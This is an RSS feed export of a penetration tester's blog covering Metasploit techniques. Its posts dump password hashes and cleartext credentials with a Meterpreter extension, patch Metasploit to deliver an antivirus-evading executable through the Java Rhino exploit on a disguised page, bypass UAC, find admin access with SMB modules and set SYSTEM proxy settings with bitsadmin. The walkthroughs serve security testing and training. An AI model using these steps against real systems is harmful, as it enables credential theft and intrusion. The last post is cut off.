<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Metasploit on Room362</title>
    <link>http://localhost:1313/tags/metasploit/</link>
    <description>Recent content in Metasploit on Room362</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
    <lastBuildDate>Mon, 08 Apr 2013 09:58:20 +0000</lastBuildDate>
    <atom:link href="http://localhost:1313/tags/metasploit/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Sessiondump Meterpreter Extension</title>
      <link>http://localhost:1313/post/2013/2013/4/8/sessiondump-meterpreter-extension/</link>
      <pubDate>Mon, 08 Apr 2013 09:58:20 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2013/2013/4/8/sessiondump-meterpreter-extension/</guid>
      <description>&lt;p&gt;Mimikatz is awesome right, so is WCE. But both have one fatal flaw, even though you can execute them in memory &lt;a href=&#34;http://localhost:1313/blog/2012/9/6/completely-in-memory-mimikatz-with-metasploit.html&#34;&gt;{link}&lt;/a&gt; - you still have to have the binaries, remember the command to execute it in memory, and ultimately transfer the entire binary over so that metasploit can do its thing.&lt;/p&gt;

&lt;p&gt;Then along came SessionDump. I only noticed this because someone was tweeting congratulations to someone on writing it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0820at205-55-4820am.png.48%20AM.png&#34; alt=&#34;Screen Shot 2013 04 08 at 5 55 48 AM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;No blog post or huge Vegas lights talk on it at DefCon or Blackhat. Just posted online in a corner of the Internet:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at206-57-4020pm.png.40%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 6 57 40 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.hsc.fr/ressources/outils/sessiondump/&#34;&gt;http://www.hsc.fr/ressources/outils/sessiondump/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Before we get started lets be clear about one thing. Sessiondump while awesome doesn&amp;rsquo;t do everything that Mimikatz does. However, it does do the feature of mimikatz that I do use the most, the logged on user hash dumping as well as the wdigest clear text password dumping. It does this as a Meterpreter extension that operates using reflective DLL injection. Does that solve our minor issues we had with mimikatz, as of right now, only partially. This code was simply posted online, not in a pull request or submitted to Metasploit in any way. So you still have to have the binary + code. What about the remembering, surely it makes it so I can just tab complete my way to passwords right? Yup, it does, but until/if it is in the Metasploit trunk you will still have to remember how to get it installed (which we will go over in a bit). The final question is yes it does still transfer a complete DLL over to the host same as any of the other extensions (not to disk mind you, just memory),.&lt;/p&gt;

&lt;p&gt;Without further ado lets go ahead and get the file and do a bunch of extracting. &lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at207-15-0220pm.png.02%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 7 15 02 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at207-15-5420pm.png.54%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 7 15 54 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And finally placing everything in it&amp;rsquo;s correct place, which was nice of the author to make easy by making the archive the same as the Metasploit directory structure:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0820at202-33-3120am.png.31%20AM.png&#34; alt=&#34;Screen Shot 2013 04 08 at 2 33 31 AM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Cool, everything should be good to go. Lets use this thing. I&amp;rsquo;m using psexec to get a shell but any way you get a windows native meterpreter fine, with one caveat, and its the same as with any of the other aforementioned tools. You need to be Admin (past UAC, w/ SeDebug privilege) or NTAUTHORITY SYSTEM.  After that it&amp;rsquo;s cake, load the extension:&lt;/p&gt;

&lt;p&gt; &lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at2010-42-0620pm.png.06%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 10 42 06 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Here is the available commands:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at2010-42-2220pm.png.22%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 10 42 22 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And run getHashes:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at2010-43-0420pm202.png.04%20PM%202.png&#34; alt=&#34;Screen Shot 2013 04 07 at 10 43 04 PM 2&#34; /&gt;&lt;/p&gt;

&lt;p&gt;or getwDigestPasswords:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at2010-43-3920pm.png.39%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 10 43 39 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Thats is, you free passwords, YAY&amp;hellip;&lt;/p&gt;

&lt;p&gt;Possible issues you may run into:&lt;/p&gt;

&lt;p&gt;1) If you are on a x64 box and meterpreter isn&amp;rsquo;t running in a x64 process it will fail saying that it doesn&amp;rsquo;t have the correct version offsets, here is how you can check:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0820at202-40-2920am.png.29%20AM.png&#34; alt=&#34;Screen Shot 2013 04 08 at 2 40 29 AM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;x64 system and Meterpreter is x86/win32. Lets find a good process to migrate into and kick it from there. Winlogon isn&amp;rsquo;t the greatest choices since if meterpreter decides to crash it during migration then the system will go down, whereas a service running as SYSTEM will probably just restart if something fails.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at2010-43-0420pm.png.04%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 10 43 04 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;2) If by any chance you are running it against a system the author hasn&amp;rsquo;t gotten the offsets for. I don&amp;rsquo;t&amp;rsquo; have a screenshot for this one because he covers all the languages I have CMs for, but the author was awesome enough to include a few python scripts that can help you generate the correct offsets. I&amp;rsquo;ll show you by running it on my lsass and widgets.dll files even though he already has this data included in the CSV file that comes with session dump.&lt;/p&gt;

&lt;p&gt;Thats all for now folks, may the shells be with you.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Metasploit Mastery meets CanSecWest</title>
      <link>http://localhost:1313/post/2013/2013/1/25/metasploit-mastery-meets-cansecwest/</link>
      <pubDate>Fri, 25 Jan 2013 16:12:20 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2013/2013/1/25/metasploit-mastery-meets-cansecwest/</guid>
      <description>&lt;p&gt;In 2012 @&lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;egypt&lt;/a&gt;and I taught &lt;a href=&#34;https://www.derbycon.com/traning-classes-2012/#metasploit&#34;&gt;Metasploit Mastery&lt;/a&gt; for a day and a half @&lt;a href=&#34;https://twitter.com/derbycon&#34;&gt;DerbyCon&lt;/a&gt; . This was a lot of fun but we had to cram a TON of slides into that short period of time. PLUS we had a CTF at the end where people had to break into a corporate network (virtualized) and sell their shells, data, passwords, or flags to us (egypt and I were acting as opposing countries). You could sell low to one and high to another whatever. Most money at the end wins. (We used a score card with ranges to keep it even)&lt;/p&gt;

&lt;p&gt;We are doubling down on the content being provided and doing a 3 full days @ &lt;a href=&#34;https://twitter.com/secwest&#34;&gt;CanSecWest&lt;/a&gt;. You get to learn the nooks and cranies of Metasploit&amp;rsquo;s guts from &lt;em&gt;the&lt;/em&gt; egypt himself, and operational use from me, with a ton mixed in between. I mean, just getting in the room with egypt&amp;rsquo;s beard is worth the price of admission.&lt;/p&gt;

&lt;p&gt;See you there!&lt;/p&gt;

&lt;p&gt;Link: &lt;a href=&#34;http://cansecwest.com/dojos/2013/meta_mastery.html&#34;&gt;http://cansecwest.com/dojos/2013/meta_mastery.html&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>EXE::Custom in Metasploit&#39;s Java Exploits</title>
      <link>http://localhost:1313/post/2012/20121119execustom-in-metasploits-java-exploits-html/</link>
      <pubDate>Mon, 19 Nov 2012 05:59:10 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2012/20121119execustom-in-metasploits-java-exploits-html/</guid>
      <description>&lt;p&gt;Let me say first off that this isn&amp;rsquo;t the most elegant of ways to accomplish it. It is in the &amp;ldquo;it works for me&amp;rdquo; stage.&lt;/p&gt;

&lt;p&gt;A quick primer on EXE::Custom: This is a setting just like RHOST in Metasploit wherever an EXE is built for Windows payloads. Such as PSEXEC, BypassUAC, etc. It tells Metasploit to ignore all of your payload settings and just use the EXE you have specified. Now this does come at a bit of a cost. If you don&amp;rsquo;t have a handler set up to catch whatever is in your EXE and you have bogus information in your payload settings for your module, Metasploit won&amp;rsquo;t be able to magically determine what you want it to do. So make sure that you either have the payload settings correct (even though it won&amp;rsquo;t use them for the exploit) or set the option &amp;ldquo;DisablePayloadHandler&amp;rdquo; to true and start your own handler somewhere else.&lt;/p&gt;

&lt;p&gt;With that said, the Java Signed Applet attack is one of the most widely used, one problem in the Metasploit module version is that you have no external control (such as EXE::Custom) for the binary that is dropped if you are using a Windows native payload. (I do highly recommend trying out Java Meterpreter, but that it for another post)&lt;/p&gt;

&lt;p&gt;Here is the hack that gets me by until a more elegant solution is thought up by smarter people than I:&lt;/p&gt;

&lt;p&gt;We are going to use the Java Rhino exploit, and this story starts with an undetectable.exe sitting in /tmp/ - How you bypass the AV you are up against is up to you. The first thing we need to do is make a core library change. Yes, this is as scary as it sounds and you should document any time you do so you can revert as needed.&lt;/p&gt;

&lt;p&gt;In your MSF directory open up lib/msf/util/exe.rb - should look something like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_67.png&#34; alt=&#34;Capture 67&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Scroll down or search for &amp;ldquo;self.to_jar&amp;rdquo; - should look something like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_68.png&#34; alt=&#34;Capture 68&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Now add &amp;ldquo;exe = File.read(&amp;lsquo;/path/to/your/evil.exe&amp;rsquo;) as demonstrated below:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_69.png&#34; alt=&#34;Capture 69&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Cool. We&amp;rsquo;ve made our change, now we have to pull down a jar generated with our evil bin, and the Rhino exploit. We can do that by spinning up Metasploit with our newly editing core library. Load up the Rhino exploit via &amp;ldquo;use exploit/multi/browser/java_rhino&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_71.png&#34; alt=&#34;Capture 71&#34; /&gt;&lt;/p&gt;

&lt;p&gt;One trip up that I messed up even just creating this blog post (and a constant headache in the #Metasploit channel on Freenode) is forgetting to set the TARGET variable in Java exploits. The default payload type being Java. Since we are using a native windows binary we need to specify Windows by setting TARGET 1.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_82.png&#34; alt=&#34;Capture 82&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Run the exploit with any settings, since we&amp;rsquo;ll be just pulling out what we need. Then pull down the exploit JAR file with wget:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_73.png&#34; alt=&#34;Capture 73&#34; /&gt;&lt;/p&gt;

&lt;p&gt;(Most java exploits are set to answer ANY .jar extension request with the payload.)&lt;/p&gt;

&lt;p&gt;The HTML to load the JAR is pretty straight forward, but if you&amp;rsquo;ve never seen it before here it is:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_74.png&#34; alt=&#34;Capture 74&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Thats it. A very blank page with an exploit in it. We can do better than that:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_75.png&#34; alt=&#34;Capture 75&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Obviously you can do whatever you want with the HTML, mirror a site or what have you. Notice that I&amp;rsquo;ve also changed the name of the JAR. (You can&amp;rsquo;t change the class unless you start making changes to the exploit directly and I wanted to keep this as generically applicable as possible)&lt;/p&gt;

&lt;p&gt;Move the Applet.jar to SuperMario.jar and start up a Web server (for demo using Python&amp;rsquo;s awesome SimpleHTTPServer, but apache will serve as well)&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_79.png&#34; alt=&#34;Capture 79&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Don&amp;rsquo;t forget to start up a handler for our now-external exploit:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_80.png&#34; alt=&#34;Capture 80&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Victim views the site:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_81.png&#34; alt=&#34;Capture 81&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And WA-LA! we haz shell:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_83.png&#34; alt=&#34;Capture 83&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Yay… Game over..&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Finding Admin Access</title>
      <link>http://localhost:1313/post/2012/20121030finding-admin-access-html/</link>
      <pubDate>Wed, 31 Oct 2012 01:28:22 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2012/20121030finding-admin-access-html/</guid>
      <description>&lt;p&gt;You&amp;rsquo;ve got shell, and a set of credentials but you&amp;rsquo;re coming up empty on what you can do with those credentials. This is especially problematic when you can&amp;rsquo;t get past UAC as you are either in a AlwaysNotify situation or not a local admin.&lt;/p&gt;

&lt;p&gt;(I&amp;rsquo;m not trying to pull some some &amp;ldquo;insert magic here&amp;rdquo; on the assumption of credentials just at the time of this writing I have only just started working (created a blank file) on a post module to do this as your current user, so until then, you need credentials)&lt;/p&gt;

&lt;p&gt;Enter the auxiliary module:  &lt;strong&gt;auxiliary/admin/smb/check_dir_file&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;First we set up a route as aux modules don&amp;rsquo;t have a &amp;ldquo;SESSION&amp;rdquo; parameter:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_49.png&#34; alt=&#34;Capture 49&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Use the module and set our credentials:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_50.png&#34; alt=&#34;Capture 50&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Next, set ADMIN$ as we can&amp;rsquo;t guarantee C$ is the primary drive, but ADMIN$ will definitely be the WINDOWS directory. Our RHOSTS is our target range&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_51.png&#34; alt=&#34;Capture 51&#34; /&gt;&lt;/p&gt;

&lt;p&gt;A simple &amp;lsquo;run&amp;rsquo; and away it goes:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_52.png&#34; alt=&#34;Capture 52&#34; /&gt;&lt;/p&gt;

&lt;p&gt;So we can see that our lowly user that doesn&amp;rsquo;t have any chance of bypassing the UAC on his current system can pivot to these other systems (172.16.10.10, and 172.16.10.150) quite easily.&lt;/p&gt;

&lt;p&gt;=============================================================================&lt;/p&gt;

&lt;p&gt;The rest of this has nothing to do about admin access, just some tricks to do it better&lt;/p&gt;

&lt;p&gt;=============================================================================&lt;/p&gt;

&lt;p&gt;As many of you know I&amp;rsquo;m not a huge fan of sending packets I don&amp;rsquo;t need to so instead of just spraying a range (which I doubt would be seen, but why take the chance?)&lt;/p&gt;

&lt;p&gt;[&lt;strong&gt;Update&lt;/strong&gt;: While computer_browser_discovery does lookup all the hosts and sends -more- packets than check_dir_file would, those extra packets are sent at DNS resolvers not into empty space that can be detected by network sensors]&lt;/p&gt;

&lt;p&gt;Enter computer_browser_discovery:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_53.png&#34; alt=&#34;Capture 53&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This module does the equivalent of &amp;lsquo;net view&amp;rsquo; to get a list of computers on the domain. You can change the LTYPE to &amp;ldquo;SQL&amp;rdquo; to just get MSSQL boxes but we&amp;rsquo;re going for everything:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_54.png&#34; alt=&#34;Capture 54&#34; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see WIN7X86 (the box we are on came up with 0.0.0.0) expected. and the .150 address didn&amp;rsquo;t show up at all as it&amp;rsquo;s not on the domain. So the benefits is that it&amp;rsquo;s quieter on the wire and you probably will find hosts that aren&amp;rsquo;t in your immediate IP range. (Not the case here simply because I don&amp;rsquo;t have a big enough test network). The disadvantages are as with the .150 address you may miss hosts.&lt;/p&gt;

&lt;p&gt;Next we add the found host&amp;rsquo;s IP addresses to a text file (targethosts.txt)&lt;/p&gt;

&lt;p&gt;[because at the time of this writing the computer_browser_discovery module doesn&amp;rsquo;t add the hosts to the MSF database]&lt;/p&gt;

&lt;p&gt;Then use the smb_version module which does a couple things, it verifies that the hosts are there and alive, adds them to the MSF database, and what version of Windows (or samba) they are running:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_55.png&#34; alt=&#34;Capture 55&#34; /&gt;&lt;/p&gt;

&lt;p&gt;(We still have our route set up so this is module is going through our low privilege user still)&lt;/p&gt;

&lt;p&gt;And now we have info in the DB for better targeting:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_56.png&#34; alt=&#34;Capture 56&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Then back in our check_dir_file module we just use the hosts -R to have the database automatically set RHOSTS to the hosts in the database that match your search or alternatively use services -p 445 -R to add all the hosts that you&amp;rsquo;ve found port 445 open (everything smb_version finds will be shown in services)&lt;/p&gt;

&lt;p&gt;One more way you can get hosts is doing reverse lookups of ranges. You can just hit a range you know of, or guess ranges based on the computer_browser_discovery results. You can do this with resolve_ip module (this can be pretty slow on ranges that don&amp;rsquo;t have many hosts):&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_58.png&#34; alt=&#34;Capture 58&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I used the range this blog is hosted on 1) because for some reason my stupid VM wasn&amp;rsquo;t resolving internal stuff 2) To demonstrate that you can use the module to resolve anything, not just internal ranges.&lt;/p&gt;

&lt;p&gt;So to wrap up, we have a ton of ways to find hosts that don&amp;rsquo;t involve traditional scanning (smb_version is the only thing that comes close). And we&amp;rsquo;ve located two hosts that we have the ability to administer. One oddly enough being the domain controller, so don&amp;rsquo;t ever discount the access you already have. Tunnel vision is the pentesters worst enemy.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt; &lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>BypassUAC got a facelift</title>
      <link>http://localhost:1313/post/2012/20121030bypassuac-got-a-facelift-html/</link>
      <pubDate>Tue, 30 Oct 2012 20:05:21 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2012/20121030bypassuac-got-a-facelift-html/</guid>
      <description>&lt;p&gt;Dave Kennedy and Kevin Mitnick submitted the &amp;ldquo;bypassuac&amp;rdquo; post module to Metasploit a while back (last DerbyCon?). Which is awesome and they did some fantastic work, but I had a few complaints as probably anyone did who used the module on a somewhat modern network.&lt;/p&gt;

&lt;p&gt;&amp;ldquo;Old&amp;rdquo; module (post/windows/escalate/bypassuac):&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-3020at203-03-1020pm.png.10%20PM.png&#34; alt=&#34;Screen Shot 2012 10 30 at 3 03 10 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I decided to give it a bit of a face lift:&lt;/p&gt;

&lt;p&gt;&amp;ldquo;New&amp;rdquo; local exploit module (exploit/windows/local/bypassuac):&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-3020at203-07-1020pm.png.10%20PM.png&#34; alt=&#34;Screen Shot 2012 10 30 at 3 07 10 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;All of the credit for the availability of this module goes to &lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;@egyp7&lt;/a&gt; though, without his epic addition of local exploits to Metasploit the majority of the updates to this module wouldn&amp;rsquo;t be possible.&lt;/p&gt;

&lt;p&gt;Anywho, on to the new features:&lt;/p&gt;

&lt;p&gt;1) You can set any windows payload you want to use now:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-3020at203-38-1920pm.png.19%20PM.png&#34; alt=&#34;Screen Shot 2012 10 30 at 3 38 19 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;and yes it supports EXE::Custom.&lt;/p&gt;

&lt;p&gt;2) It lets you know if it will be able to bypass the current setting of UAC or not:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-3020at203-40-1520pm.png.15%20PM.png&#34; alt=&#34;Screen Shot 2012 10 30 at 3 40 15 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Even when you&amp;rsquo;re going overkill with it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-3020at203-41-3120pm.png.31%20PM.png&#34; alt=&#34;Screen Shot 2012 10 30 at 3 41 31 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;(ASK module if UAC is disabled will just elevate without any kind of user prompt)&lt;/p&gt;

&lt;p&gt;And of course it works as expected if UAC needs bypassing:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_47.png&#34; alt=&#34;Capture 47&#34; /&gt;&lt;/p&gt;

&lt;p&gt;One thing I have yet to update is a simple check to make sure you are an admin that can actually bypass UAC. If you aren&amp;rsquo;t, then you&amp;rsquo;ll be leaving this lovely calling card behind for the user:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_48.png&#34; alt=&#34;Capture 48&#34; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt; &lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Setting SYSTEM&#39;s proxy settings with Metasploit</title>
      <link>http://localhost:1313/post/2012/20121021setting-systems-proxy-settings-with-metasploit-html/</link>
      <pubDate>Sun, 21 Oct 2012 07:40:11 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2012/20121021setting-systems-proxy-settings-with-metasploit-html/</guid>
      <description>&lt;p&gt;One of the great things about the reverse_http(s) payloads is that it is proxy aware. However one of the pitfalls to this is that SYSTEM doesn&amp;rsquo;t have proxy settings, nor do users who have never logged into a system (unless profile loading is triggered). The problem here arrises when you are trying to do anything as SYSTEM, also the PSEXEC only has the option of getting you a SYSTEM shell (so you&amp;rsquo;re done for right out of the door)&lt;/p&gt;

&lt;p&gt;Now, there is a stub in Metasploit that I have been unable to complete due to my lack of knowledge in the shell code world. The stub allows you to create payloads that have static proxies, which basically invalidates the need for the following. Until then here is a few ways to set / read the proxy settings for SYSTEM or any other user for that matter.&lt;/p&gt;

&lt;p&gt;(Its here if you want to take a whack at it: external/source/shellcode/windows/x86/src/block/block_reverse_https_proxy.asm )&lt;/p&gt;

&lt;p&gt;One of the ways @&lt;a href=&#34;https://twitter.com/carnal0wnage&#34;&gt;carnal0wnage&lt;/a&gt; and I demoed @&lt;a href=&#34;https://twitter.com/derbycon&#34;&gt;DerbyCon&lt;/a&gt; was using the bitsadmin binary. Windows7/Vista/2008 come with version 2.0+ which has this great ability to run the following:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;bitsadmin /util /setieproxy localsystem MANUAL_PROXY 192.168.1.55:3128 &amp;ldquo;;&amp;rdquo;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;(2000,XP,2003 you could upload a copy of bitsadmin that was new enough and that would still work)&lt;/p&gt;

&lt;p&gt;That command sets the proxy settings for the SYSTEM account. I was able to jump through hoops and do this remotely by using the windows/exec payload via psexec, then reverse_http(s) would work.&lt;/p&gt;

&lt;p&gt;But I wanted a better way to do this. I watched the execution of bitsadmin to see what it was doing and all it was actually doing is setting a registry key. Awesome, I can do that.&lt;/p&gt;

&lt;p&gt;Enter enum_proxy:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-2120at203-29-1420am.png.14%20AM.png&#34; alt=&#34;Screen Shot 2012 10 21 at 3 29 14 AM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And&amp;hellip;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-2120at203-29-2520am.png.25%20AM.png&#34; alt=&#34;Screen Shot 2012 10 21 at 3 29 25 AM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;If you&amp;rsquo;ve noticed that RHOST option, Metasploit has the ability to do remote registry calls as well (this module will attempt to start the RemoteRegistry service if the user has the privilege to do so):&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-2120at203-29-4020am.png.40%20AM.png&#34; alt=&#34;Screen Shot 2012 10 21 at 3 29 40 AM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Output from it finding a disabled RemoteRegistry:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf post(enum_proxy) &amp;gt; run




[-] Unable to contact remote registry service on 172.16.10.217&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] Attempting to start service remotely...&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] Proxy Counter = 9&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] Setting: WPAD and AutoConfigure script&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] AutoConfigURL: http://anotherproxyserver/pac.pac&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] Post module execution completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;ldquo;Awesome but you promised setting the proxy settings&amp;rdquo;, well right now all I can give you is a cloner ;-)&lt;/p&gt;

&lt;p&gt;Enter clone_proxy_settings module:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-2120at203-33-3520am.png.35%20AM.png&#34; alt=&#34;Screen Shot 2012 10 21 at 3 33 35 AM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And thats it. Still working on an actual &amp;ldquo;set_proxy&amp;rdquo; module, but this should do for now, and a lot less to type.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;As of this post both are currently pull requests:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/942&#34;&gt;https://github.com/rapid7/metasploit-framework/pull/942&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/943&#34;&gt;https://github.com/rapid7/metasploit-framework/pull/943&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Mounting SMB shares over Meterpreter</title>
      <link>http://localhost:1313/post/2012/20121017mounting-smb-shares-over-meterpreter-html/</link>
      <pubDate>Wed, 17 Oct 2012 17:52:30 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2012/20121017mounting-smb-shares-over-meterpreter-html/</guid>
      <description>&lt;p&gt;Ok, this is pretty straight forward no magic:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-1720at2011-00-1620am.png.16%20AM.png&#34; alt=&#34;Screen Shot 2012 10 17 at 11 00 16 AM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Got a shell, doesn&amp;rsquo;t have to be SYSTEM&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-1720at2011-00-4420am.png.44%20AM.png&#34; alt=&#34;Screen Shot 2012 10 17 at 11 00 44 AM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Add a route to the internal range or directly to the host you want over the session you want&lt;/p&gt;

